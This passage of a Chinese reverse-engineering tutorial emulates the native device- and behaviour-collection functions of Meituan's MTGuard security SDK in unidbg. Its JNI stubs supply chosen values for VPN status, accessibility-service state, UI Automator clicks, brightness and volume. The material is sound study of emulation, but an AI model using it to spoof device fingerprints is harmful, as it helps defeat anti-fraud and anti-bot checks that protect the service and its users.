        <content type="html"><![CDATA[<h1 id="从实践中学习unidbg使用-六"><a href="#从实践中学习unidbg使用-六" class="headerlink" title="从实践中学习unidbg使用(六)"></a>从实践中学习unidbg使用(六)</h1><h3 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h3><p>本篇样本详见参考</p><h3 id="二、任务介绍"><a href="#二、任务介绍" class="headerlink" title="二、任务介绍"></a>二、任务介绍</h3><p><strong>Jadx</strong> 反编译 APK，找到 <strong>com.meituan.android.common.mtguard.NBridge</strong> 类，这是 <strong>MTGuard 安全 SDK</strong> 的一个 Java 桥接层。其中有一个叫 <strong>SIUACollector</strong> 的内部类，里面有以下这些 Native 方法。</p><pre><code class="language-Java">private native String getEnvironmentInfo();private native String getEnvironmentInfoExtra();private native String getExternalEquipmentInfo();private native String getHWEquipmentInfo();private native String getHWProperty();private native String getHWStatus();private native String getLocationInfo();private native String getPlatformInfo();private native String getUserAction();public native String startCollection();</code></pre><p>是 “<strong>安全信息与用户行为采集器</strong>” ，收集 <strong>硬件信息</strong>、检查 <strong>网络信息</strong>、获取 <strong>应用信息</strong>、<strong>电池状态</strong> 等。</p><p>请在 Unidbg 中依次执行这十个函数，本篇的重点是巩固 Unidbg 补环境的形式，以及学习 Unidbg 补环境的内容。</p><h3 id="三、初始化"><a href="#三、初始化" class="headerlink" title="三、初始化"></a>三、初始化</h3><p>首先搭一个基本架子</p><pre><code class="language-java">package com.test4;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.AbstractJni;import com.github.unidbg.linux.android.dvm.DalvikModule;import com.github.unidbg.linux.android.dvm.DvmClass;import com.github.unidbg.linux.android.dvm.VM;import com.github.unidbg.memory.Memory;import java.io.File;public class TEST4 extends AbstractJni &#123;    private final AndroidEmulator emulator;    private final DvmClass SIUACollector;    private final VM vm;    public TEST4() &#123;        emulator = AndroidEmulatorBuilder                .for32Bit()                .addBackendFactory(new Unicorn2Factory(true))                .setProcessName(&quot;com.dianping.v1&quot;)                .build();        Memory memory = emulator.getMemory();        memory.setLibraryResolver(new AndroidResolver(23));        vm = emulator.createDalvikVM(new File(&quot;E:\\AndroidTools\\unidbg\\unidbg-android\\src\\test\\java\\com\\test4\\dazhongdianping.apk&quot;));        vm.setJni(this);        vm.setVerbose(true);        DalvikModule dm = vm.loadLibrary(&quot;mtguard&quot;, true);        SIUACollector = vm.resolveClass(&quot;com/meituan/android/common/mtguard/NBridge$SIUACollector&quot;);        dm.callJNI_OnLoad(emulator);    &#125;        public static void main(String[] args) &#123;        TEST4 test4 = new TEST4();    &#125;    &#125;</code></pre><p>内部类和外部类之间用过 <strong>$</strong> 分割，这是 Java 中固定的表示法。</p><p>运行看到报错</p><pre><code class="language-shell">[10:57:05 459]  INFO [com.github.unidbg.linux.AndroidElfLoader] (AndroidElfLoader:481) - libmtguard.so load dependency libandroid.so failed[10:57:05 472]  INFO [com.github.unidbg.linux.AndroidElfLoader] (AndroidElfLoader:481) - libmtguard.so load dependency libjnigraphics.so failedJNIEnv-&gt;FindClass(com/meituan/android/common/mtguard/NBridge) was called from RX@0x1200545d[libmtguard.so]0x545dJNIEnv-&gt;RegisterNatives(com/meituan/android/common/mtguard/NBridge, RW@0x120d0004[libmtguard.so]0xd0004, 1) was called from RX@0x120054c7[libmtguard.so]0x54c7RegisterNative(com/meituan/android/common/mtguard/NBridge, main(I[Ljava/lang/Object;)[Ljava/lang/Object;, RX@0x1205c589[libmtguard.so]0x5c589)JNIEnv-&gt;FindClass(com/meituan/android/common/mtguard/NBridge$SIUACollector) was called from RX@0x12005591[libmtguard.so]0x5591JNIEnv-&gt;RegisterNatives(com/meituan/android/common/mtguard/NBridge$SIUACollector, RW@0x122d205c, 10) was called from RX@0x120055c7[libmtguard.so]0x55c7RegisterNative(com/meituan/android/common/mtguard/NBridge$SIUACollector, getHWProperty()Ljava/lang/String;, RX@0x1200a931[libmtguard.so]0xa931)RegisterNative(com/meituan/android/common/mtguard/NBridge$SIUACollector, getEnvironmentInfoExtra()Ljava/lang/String;, RX@0x12007111[libmtguard.so]0x7111)RegisterNative(com/meituan/android/common/mtguard/NBridge$SIUACollector, getEnvironmentInfo()Ljava/lang/String;, RX@0x12006df9[libmtguard.so]0x6df9)RegisterNative(com/meituan/android/common/mtguard/NBridge$SIUACollector, getHWStatus()Ljava/lang/String;, RX@0x1201a86d[libmtguard.so]0x1a86d)RegisterNative(com/meituan/android/common/mtguard/NBridge$SIUACollector, getHWEquipmentInfo()Ljava/lang/String;, RX@0x12028841[libmtguard.so]0x28841)RegisterNative(com/meituan/android/common/mtguard/NBridge$SIUACollector, getExternalEquipmentInfo()Ljava/lang/String;, RX@0x120353f5[libmtguard.so]0x353f5)RegisterNative(com/meituan/android/common/mtguard/NBridge$SIUACollector, getUserAction()Ljava/lang/String;, RX@0x12040159[libmtguard.so]0x40159)RegisterNative(com/meituan/android/common/mtguard/NBridge$SIUACollector, getPlatformInfo()Ljava/lang/String;, RX@0x120464e1[libmtguard.so]0x464e1)RegisterNative(com/meituan/android/common/mtguard/NBridge$SIUACollector, getLocationInfo()Ljava/lang/String;, RX@0x1204f909[libmtguard.so]0x4f909)RegisterNative(com/meituan/android/common/mtguard/NBridge$SIUACollector, startCollection()Ljava/lang/String;, RX@0x1205ab41[libmtguard.so]0x5ab41)</code></pre><p>加载 libandroid.so、libjnigraphics.so 失败，前面我们提过它俩的虚拟模块。</p><pre><code class="language-Java">public TEST4() &#123;        emulator = AndroidEmulatorBuilder                .for32Bit()                .addBackendFactory(new Unicorn2Factory(true))                .setProcessName(&quot;com.dianping.v1&quot;)                .build();        Memory memory = emulator.getMemory();        memory.setLibraryResolver(new AndroidResolver(23));        vm = emulator.createDalvikVM(new File(&quot;E:\\AndroidTools\\unidbg\\unidbg-android\\src\\test\\java\\com\\test4\\dazhongdianping.apk&quot;));        vm.setJni(this);        vm.setVerbose(true);                // 使用 libandroid.so 的虚拟模块        new AndroidModule(emulator, vm).register(memory);        // 使用 libjnigraphics.so 的虚拟模块        new JniGraphics(emulator, vm).register(memory);                DalvikModule dm = vm.loadLibrary(&quot;mtguard&quot;, true);        SIUACollector = vm.resolveClass(&quot;com/meituan/android/common/mtguard/NBridge$SIUACollector&quot;);        dm.callJNI_OnLoad(emulator);    &#125;</code></pre><p>再次运行就不会报依赖库缺少的错误了，Unidbg 目前一共实现有以下几个虚拟模块。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250810110108107.png" alt="image-20250810110108107"></p><h3 id="四、getEnvironmentInfo"><a href="#四、getEnvironmentInfo" class="headerlink" title="四、getEnvironmentInfo"></a>四、getEnvironmentInfo</h3><p>这十个函数都是实例方法，为了免于重复 <strong>newObject</strong>，将 <strong>SIUACollector</strong> 处理为 DvmObject。同时，添加对文件访问的拦截处理，样本可能有文件操作。</p><pre><code class="language-Java">package com.test4;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.Emulator;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.file.FileResult;import com.github.unidbg.file.IOResolver;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.*;import com.github.unidbg.memory.Memory;import com.github.unidbg.virtualmodule.android.AndroidModule;import com.github.unidbg.virtualmodule.android.JniGraphics;import java.io.File;public class TEST4 extends AbstractJni implements IOResolver &#123;    private final AndroidEmulator emulator;    private final DvmObject&lt;?&gt; SIUACollector;    private final VM vm;    public TEST4() &#123;        emulator = AndroidEmulatorBuilder                .for32Bit()                .addBackendFactory(new Unicorn2Factory(true))                .setProcessName(&quot;com.dianping.v1&quot;)                .build();        Memory memory = emulator.getMemory();        memory.setLibraryResolver(new AndroidResolver(23));        vm = emulator.createDalvikVM(new File(&quot;E:\\AndroidTools\\unidbg\\unidbg-android\\src\\test\\java\\com\\test4\\dazhongdianping.apk&quot;));        vm.setJni(this);        vm.setVerbose(true);        emulator.getSyscallHandler().addIOResolver(this);        // 使用 libandroid.so 的虚拟模块        new AndroidModule(emulator, vm).register(memory);        // 使用 libjnigraphics.so 的虚拟模块        new JniGraphics(emulator, vm).register(memory);        DalvikModule dm = vm.loadLibrary(&quot;mtguard&quot;, true);        SIUACollector = vm.resolveClass(&quot;com/meituan/android/common/mtguard/NBridge$SIUACollector&quot;).newObject(null);        dm.callJNI_OnLoad(emulator);    &#125;    @Override    public FileResult resolve(Emulator emulator, String pathname, int oflags) &#123;        System.out.println(&quot;lilac open: &quot; + pathname);        return null;    &#125;    public static void main(String[] args) &#123;        TEST4 test4 = new TEST4();        System.out.println(&quot;[*] getEnvironmentInfo:&quot; + test4.getEnvironmentInfo());    &#125;&#125;</code></pre><p>发起对 getEnvironmentInfo 的调用</p><pre><code class="language-Java">    public static void main(String[] args) &#123;        TEST4 test4 = new TEST4();        System.out.println(&quot;[*] getEnvironmentInfo:&quot; + test4.getEnvironmentInfo());    &#125;    public String getEnvironmentInfo() &#123;        String result = SIUACollector.callJniMethodObject(emulator, &quot;getEnvironmentInfo()Ljava/lang/String;&quot;).getValue().toString();        return result;    &#125;</code></pre><p>运行发现直接得出了结果，无需补环境。</p><pre><code class="language-shell">JNIEnv-&gt;NewStringUTF(&quot;0|0|0|-|0|&quot;) was called from RX@0x12006f5f[libmtguard.so]0x6f5fJNIEnv-&gt;NewStringUTF(&quot;0|0|0|-|0|&quot;) was called from RX@0x12006ef7[libmtguard.so]0x6ef7[*] getEnvironmentInfo:0|0|0|-|0|</code></pre><h3 id="五、getEnvironmentInfoExtra"><a href="#五、getEnvironmentInfoExtra" class="headerlink" title="五、getEnvironmentInfoExtra"></a>五、getEnvironmentInfoExtra</h3><p>发起调用</p><pre><code class="language-Java">    public static void main(String[] args) &#123;        TEST4 test4 = new TEST4();        System.out.println(&quot;[*] getEnvironmentInfo:&quot; + test4.getEnvironmentInfo());        System.out.println(&quot;[*] getEvironmentInfoExtra:&quot; + test4.getEvironmentInfoExtra());    &#125;    public String getEnvironmentInfo() &#123;        String result = SIUACollector.callJniMethodObject(emulator, &quot;getEnvironmentInfo()Ljava/lang/String;&quot;).getValue().toString();        return result;    &#125;    public String getEvironmentInfoExtra() &#123;        String result = SIUACollector.callJniMethodObject(emulator, &quot;getEnvironmentInfoExtra()Ljava/lang/String;&quot;).getValue().toString();        return result;    &#125;</code></pre><p>运行发现报错，需要开始补环境了</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250810113618928.png" alt="image-20250810113618928"></p><p>分配一个 <strong>StringBuilder</strong> 对象。对 <strong>allocObject</strong> 这个 JNI 调用感到陌生，上网查了下，它用于分配对象，我们可以在 AbstractJNI 中得到参考。</p><pre><code class="language-java">    @Override    public DvmObject&lt;?&gt; allocObject(BaseVM vm, DvmClass dvmClass, String signature) &#123;        if (&quot;java/util/HashMap-&gt;allocObject&quot;.equals(signature)) &#123;            return dvmClass.newObject(new HashMap&lt;&gt;());        &#125;        throw new UnsupportedOperationException(signature);    &#125;</code></pre><p>同理处理</p><pre><code class="language-Java">    @Override    public DvmObject&lt;?&gt; allocObject(BaseVM vm, DvmClass dvmClass, String signature) &#123;        switch (signature) &#123;            case &quot;java/lang/StringBuilder-&gt;allocObject&quot;: &#123;                return dvmClass.newObject(new StringBuilder());            &#125;        &#125;        return super.allocObject(vm, dvmClass, signature);    &#125;</code></pre><p>但是按照前文所讨论的规范，StringBuilder 是 JDK 中的类库，使用 <strong>ProxyDvmObject.createObject</strong> 更好。</p><pre><code class="language-Java">    @Override    public DvmObject&lt;?&gt; allocObject(BaseVM vm, DvmClass dvmClass, String signature) &#123;        switch (signature) &#123;            case &quot;java/lang/StringBuilder-&gt;allocObject&quot;: &#123;                return ProxyDvmObject.createObject(vm, new StringBuilder());            &#125;        &#125;        return super.allocObject(vm, dvmClass, signature);    &#125;</code></pre><p>继续运行，报错<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250810114335805.png" alt="image-20250810114335805"></p><p>刚分配的 <strong>StringBuilder</strong> 对象，这里在做初始化，什么都不必处理。</p><pre><code class="language-Java">    @Override    public void callVoidMethodV(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VaList vaList) &#123;        switch (signature) &#123;            case &quot;java/lang/StringBuilder-&gt;&lt;init&gt;()V&quot;: &#123;                return;            &#125;        &#125;        super.callVoidMethodV(vm, dvmObject, signature, vaList);    &#125;</code></pre><p>其实 Unidbg 在 <strong>allocObject</strong> 这个 JNI 方法上的处理逻辑不太好，这里还没体现出来，后面再说。</p><p>继续运行和报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getEnvironmentInfo()Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>这个方法就是我们上一个补的 <strong>getEnvironmentInof</strong>，你可能觉得像下面这样处理就好了</p><pre><code class="language-Java">@Overridepublic DvmObject&lt;?&gt; callObjectMethodV(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VaList vaList) &#123;    switch (signature)&#123;        case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getEnvironmentInfo()Ljava/lang/String;&quot;:&#123;            return new StringObject(vm, getEnvironmentInfo());        &#125;    &#125;    return super.callObjectMethodV(vm, dvmObject, signature, vaList);&#125;</code></pre><p>但事实上这是行不通的，Native 方法里调用另一个 Native 方法，这属于嵌套调用，Unidbg 暂不支持这么做，所以这里手动填入先前得到的结果，</p><pre><code class="language-Java">    @Override    public DvmObject&lt;?&gt; callObjectMethodV(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VaList vaList) &#123;        switch (signature) &#123;            case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getEnvironmentInfo()Ljava/lang/String;&quot;: &#123;                return new StringObject(vm, &quot;0|0|0|-|0|&quot;);            &#125;        &#125;        return super.callObjectMethodV(vm, dvmObject, signature, vaList);    &#125;</code></pre><p>继续运行和报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/lang/StringBuilder-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:97)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>按照语义补 append 方法</p><pre><code class="language-Java">    @Override    public DvmObject&lt;?&gt; callObjectMethodV(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VaList vaList) &#123;        switch (signature) &#123;            case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getEnvironmentInfo()Ljava/lang/String;&quot;: &#123;                return new StringObject(vm, &quot;0|0|0|-|0|&quot;);            &#125;            case &quot;java/lang/StringBuilder-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;&quot;: &#123;                String str = vaList.getObjectArg(0).getValue().toString();                return ProxyDvmObject.createObject(vm, ((StringBuilder) dvmObject.getValue()).append(str));            &#125;        &#125;        return super.callObjectMethodV(vm, dvmObject, signature, vaList);    &#125;</code></pre><p>继续运行和报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;isVPN()Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:101)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>看起来是用于检测 VPN，<strong>Jadx</strong> 中看看它的实现，样本采用了自家的热修复技术<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/favicon.ico" alt="img"><a href="https://tech.meituan.com/2016/09/14/android-robust.html">Android热更新方案 Robust</a>，代码看起来不太舒服。</p><pre><code class="language-JAVA">        private String isVPN() &#123;            Object[] objArr = new Object[0];            ChangeQuickRedirect changeQuickRedirect2 = changeQuickRedirect;            return PatchProxy.isSupport(objArr, this, changeQuickRedirect2, false, &quot;b6362e66d9b10061bc6c2e73cafc0cc8&quot;, RobustBitConfig.DEFAULT_VALUE) ? (String) PatchProxy.accessDispatch(objArr, this, changeQuickRedirect2, false, &quot;b6362e66d9b10061bc6c2e73cafc0cc8&quot;) : EnvInfoWorker.isVPN();        &#125;</code></pre><p>末尾的 <strong>EnvInfoWorker.isVPN()</strong> 是其实现函数。</p><pre><code class="language-Java">public static synchronized String isVPN() &#123;    synchronized (EnvInfoWorker.class) &#123;        Object[] objArr = new Object[0];        ChangeQuickRedirect changeQuickRedirect2 = changeQuickRedirect;        if (PatchProxy.isSupport(objArr, null, changeQuickRedirect2, true, &quot;b5d91cd54a8036812d448963f1a976c9&quot;, RobustBitConfig.DEFAULT_VALUE)) &#123;            return (String) PatchProxy.accessDispatch(objArr, null, changeQuickRedirect2, true, &quot;b5d91cd54a8036812d448963f1a976c9&quot;);        &#125;        Enumeration&lt;NetworkInterface&gt; networkInterfaces = NetworkInterface.getNetworkInterfaces();        if (networkInterfaces == null) &#123;            return &quot;0&quot;;        &#125;        Iterator it = Collections.list(networkInterfaces).iterator();        while (it.hasNext()) &#123;            NetworkInterface networkInterface = (NetworkInterface) it.next();            if (networkInterface.isUp()) &#123;                if (networkInterface.getInterfaceAddresses().size() != 0 &amp;&amp; &quot;tun0&quot;.equals(networkInterface.getName())) &#123;                    return &quot;1&quot;;                &#125;            &#125;            if (&quot;ppp0&quot;.equals(networkInterface.getName())) &#123;                return &quot;1&quot;;            &#125;        &#125;        return &quot;0&quot;;    &#125;&#125;</code></pre><p>问了下 chatGPT，当客户端运行 <strong>VPN</strong> 时，会创建 <strong>tun0</strong> 或 <strong>ppp0</strong> 节点，所以出现带有明显特征的网络接口名称，就可以认定是使用了 <strong>VPN</strong> 协议进行通信。示例代码如下</p><pre><code class="language-Java">private void isDeviceInVPN() &#123;    try &#123;        Enumeration&lt;NetworkInterface&gt; networkInterfaces = NetworkInterface.getNetworkInterfaces();        while (networkInterfaces.hasMoreElements()) &#123;            String name = networkInterfaces.nextElement().getName();            if (name.equals(&quot;tun0&quot;) || name.equals(&quot;ppp0&quot;)) &#123;                stop();            &#125;        &#125;    &#125; catch (SocketException e) &#123;        e.printStackTrace();    &#125;&#125;</code></pre><p>和样本此处进行对照，可以发现返回 0 是没检测到，返回 1 就是检测到了。</p><p>读者可能想图方便，使用 Frida 在真实设备上 Hook 或 Call 这个函数，直接获得结果。但这么做有弊端，如果你真机使用了 VPN，那么就会返回 1.</p><pre><code class="language-Java">            case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;isVPN()Ljava/lang/String;&quot;: &#123;                return new StringObject(vm, &quot;0&quot;);            &#125;</code></pre><p>继续运行报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;mContext:Landroid/content/Context;at com.github.unidbg.linux.android.dvm.AbstractJni.getObjectField(AbstractJni.java:171)at com.github.unidbg.linux.android.dvm.AbstractJni.getObjectField(AbstractJni.java:141)at com.github.unidbg.linux.android.dvm.DvmField.getObjectField(DvmField.java:126)at com.github.unidbg.linux.android.dvm.DalvikVM$92.handle(DalvikVM.java:1408)</code></pre><p>Context 是一个相当特殊的对象，前面遇到过它，这里我们先用最朴素的方法去处理它——<strong>resolveClass</strong> 占位。</p><pre><code class="language-Java">    @Override    public DvmObject&lt;?&gt; getObjectField(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature) &#123;        switch (signature) &#123;            case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;mContext:Landroid/content/Context;&quot;: &#123;                return vm.resolveClass(&quot;android/content/Context&quot;).newObject(null);            &#125;        &#125;        return super.getObjectField(vm, dvmObject, signature);    &#125;</code></pre><p>继续运行报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;brightness(Landroid/content/Context;)Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:104)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>回到 <strong>Jadx</strong> 中找到对应函数</p><pre><code class="language-Java">        private String brightness(Context context) &#123;            Object[] objArr = &#123;context&#125;;            ChangeQuickRedirect changeQuickRedirect2 = changeQuickRedirect;            return PatchProxy.isSupport(objArr, this, changeQuickRedirect2, false, &quot;e3c10305f195ff2aac2fd606a6235fb2&quot;, RobustBitConfig.DEFAULT_VALUE) ? (String) PatchProxy.accessDispatch(objArr, this, changeQuickRedirect2, false, &quot;e3c10305f195ff2aac2fd606a6235fb2&quot;) : DeviceInfoWorker.brightness(context);        &#125;</code></pre><pre><code class="language-Java">    public static String brightness(Context context) &#123;        Object[] objArr = &#123;context&#125;;        ChangeQuickRedirect changeQuickRedirect2 = changeQuickRedirect;        if (PatchProxy.isSupport(objArr, null, changeQuickRedirect2, true, &quot;af80a1c664fdf95866b7caabf24ab495&quot;, RobustBitConfig.DEFAULT_VALUE)) &#123;            return (String) PatchProxy.accessDispatch(objArr, null, changeQuickRedirect2, true, &quot;af80a1c664fdf95866b7caabf24ab495&quot;);        &#125;        try &#123;            return StringUtils.toString(Settings.System.getInt(context.getContentResolver(), &quot;screen_brightness&quot;) / 255.0f);        &#125; catch (Throwable th) &#123;            c.a(th);            return StringUtils.toString(0.0f);        &#125;    &#125;</code></pre><p>从函数名和基本逻辑上看，似乎是获取屏幕亮度，Google 搜索 <strong>getContentResolver</strong> + <strong>screen_brightness</strong></p><p>，找到如下代码</p><pre><code class="language-Java">/** * 获取系统默认屏幕亮度值 屏幕亮度值范围（0-255） * **/private int getScreenBrightness(Context context) &#123;    ContentResolver contentResolver = context.getContentResolver();    int defVal = 0;    return Settings.System.getInt(contentResolver,            Settings.System.SCREEN_BRIGHTNESS, defVal);&#125;</code></pre><p>样本中返回的是 0 - 1 之间的一个数，然后转字符串，我这里选择 0.8</p><pre><code class="language-Java">            case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;brightness(Landroid/content/Context;)Ljava/lang/String;&quot;: &#123;                return new StringObject(vm, &quot;0.8&quot;);            &#125;</code></pre><p>继续运行</p><pre><code class="language-Java">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;systemVolume(Landroid/content/Context;)Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:107)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>也还是一样回到 <strong>Jadx</strong> 中查看样本的伪代码，这里是获取音量</p><pre><code class="language-Java">        private String systemVolume(Context context) &#123;            Object[] objArr = &#123;context&#125;;            ChangeQuickRedirect changeQuickRedirect2 = changeQuickRedirect;            return PatchProxy.isSupport(objArr, this, changeQuickRedirect2, false, &quot;25bed8eb997e1fc4de8fea79d40481a3&quot;, RobustBitConfig.DEFAULT_VALUE) ? (String) PatchProxy.accessDispatch(objArr, this, changeQuickRedirect2, false, &quot;25bed8eb997e1fc4de8fea79d40481a3&quot;) : DeviceInfoWorker.systemVolume(context);        &#125;</code></pre><pre><code class="language-Java">    public static String systemVolume(Context context) &#123;        Object[] objArr = &#123;context&#125;;        ChangeQuickRedirect changeQuickRedirect2 = changeQuickRedirect;        if (PatchProxy.isSupport(objArr, null, changeQuickRedirect2, true, &quot;94db8653238995da6df94fea33fbbf79&quot;, RobustBitConfig.DEFAULT_VALUE)) &#123;            return (String) PatchProxy.accessDispatch(objArr, null, changeQuickRedirect2, true, &quot;94db8653238995da6df94fea33fbbf79&quot;);        &#125;        try &#123;            AudioManager audioManager = (AudioManager) context.getSystemService(&quot;audio&quot;);            return StringUtils.toString((audioManager.getStreamVolume(1) * 100) / audioManager.getStreamMaxVolume(1));        &#125; catch (Throwable th) &#123;            c.a(th);            return &quot;&quot;;        &#125;    &#125;</code></pre><p>直接返回 0，也就是静音</p><pre><code class="language-Java">            case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;systemVolume(Landroid/content/Context;)Ljava/lang/String;&quot;: &#123;                return new StringObject(vm, &quot;0&quot;);            &#125;</code></pre><p>继续运行，报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;isAccessibilityEnable()Zat com.github.unidbg.linux.android.dvm.AbstractJni.callBooleanMethodV(AbstractJni.java:625)at com.github.unidbg.linux.android.dvm.AbstractJni.callBooleanMethodV(AbstractJni.java:603)at com.github.unidbg.linux.android.dvm.DvmMethod.callBooleanMethodA(DvmMethod.java:124)</code></pre><p>这次是 <strong>isAccessibilityEnable</strong> ，也就是所谓的无障碍服务。无障碍服务的本意是帮助残疾人士、老人、小孩等，但长久以来被用于自动化控制，比如抢单，因此无障碍服务是风险检测、环境检测、反欺诈检测的重要一环。</p><pre><code class="language-Java">    @Override    public boolean callBooleanMethodV(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VaList vaList) &#123;        switch (signature) &#123;            case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;isAccessibilityEnable()Z&quot;: &#123;                return false;            &#125;        &#125;        return super.callBooleanMethodV(vm, dvmObject, signature, vaList);    &#125;</code></pre><p>继续运行报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/lang/String-&gt;valueOf(I)Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callStaticObjectMethodV(AbstractJni.java:504)at com.github.unidbg.linux.android.dvm.AbstractJni.callStaticObjectMethodV(AbstractJni.java:438)at com.github.unidbg.linux.android.dvm.DvmMethod.callStaticObjectMethodA(DvmMethod.java:64)</code></pre><p>这个没什么问题，也是直接参照语义直接补就好了</p><pre><code class="language-Java">    @Override    public DvmObject&lt;?&gt; callStaticObjectMethodV(BaseVM vm, DvmClass dvmClass, String signature, VaList vaList) &#123;        switch (signature) &#123;            case &quot;java/lang/String-&gt;valueOf(I)Ljava/lang/String;&quot;: &#123;                return new StringObject(vm, String.valueOf(vaList.getIntArg(0)));            &#125;        &#125;        return super.callStaticObjectMethodV(vm, dvmClass, signature, vaList);    &#125;</code></pre><p>继续运行报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;uiAutomatorClickCount()Iat com.github.unidbg.linux.android.dvm.AbstractJni.callIntMethodV(AbstractJni.java:563)at com.github.unidbg.linux.android.dvm.AbstractJni.callIntMethodV(AbstractJni.java:529)at com.github.unidbg.linux.android.dvm.DvmMethod.callIntMethodA(DvmMethod.java:134)</code></pre><p><strong>uiAutomatorClickCount</strong> 的具体实现如下</p><pre><code class="language-Java">    public static int uiAutomatorClickCount() &#123;        Object[] objArr = new Object[0];        ChangeQuickRedirect changeQuickRedirect2 = changeQuickRedirect;        if (PatchProxy.isSupport(objArr, null, changeQuickRedirect2, true, &quot;7e55945fa3fd311f57ffc508c34fa364&quot;, RobustBitConfig.DEFAULT_VALUE)) &#123;            return ((Integer) PatchProxy.accessDispatch(objArr, null, changeQuickRedirect2, true, &quot;7e55945fa3fd311f57ffc508c34fa364&quot;)).intValue();        &#125;        if (verify()) &#123;            return mAdapter.uiAutomatorCount();        &#125;        return 0;    &#125;</code></pre><p>这个类的主要作用是返回 <strong>UI Automator 点击次数</strong>，可以Frida Hook 看一下</p><pre><code class="language-js">Java.perform(function() &#123;    let SIUACollector = Java.use(&quot;com.meituan.android.common.mtguard.NBridge$SIUACollector&quot;);    SIUACollector[&quot;uiAutomatorClickCount&quot;].implementation = function () &#123;        console.log(&#39;uiAutomatorClickCount is called&#39;);        let ret = this.uiAutomatorClickCount();        console.log(&#39;uiAutomatorClickCount ret value is &#39; + ret);        return ret;    &#125;;&#125;)</code></pre><p>结果如下</p><pre><code class="language-shell">uiAutomatorClickCount ret value is 0</code></pre><p>那么就可以补环境了</p><pre><code class="language-Java">    @Override    public int callIntMethodV(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VaList vaList) &#123;        switch (signature) &#123;            case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;uiAutomatorClickCount()I&quot;: &#123;                return 0;            &#125;        &#125;        return super.callIntMethodV(vm, dvmObject, signature, vaList);    &#125;</code></pre><p>继续运行报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/lang/StringBuilder-&gt;toString()Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:110)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at 